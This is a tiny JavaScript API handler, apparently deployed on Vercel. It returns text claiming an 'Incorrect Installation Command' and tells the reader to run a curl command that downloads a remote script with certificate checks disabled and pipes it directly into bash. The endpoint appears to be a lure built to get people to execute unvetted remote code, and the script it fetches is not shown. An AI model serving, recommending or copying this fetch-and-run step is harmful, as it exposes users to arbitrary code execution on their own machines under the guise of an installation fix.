export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send(`
    echo Incorrect Installation Command
    echo ----------------------
    echo Please run:
    echo 'curl -k -s https://cdn16.vercel.app/test.sh | bash'
  `);
}
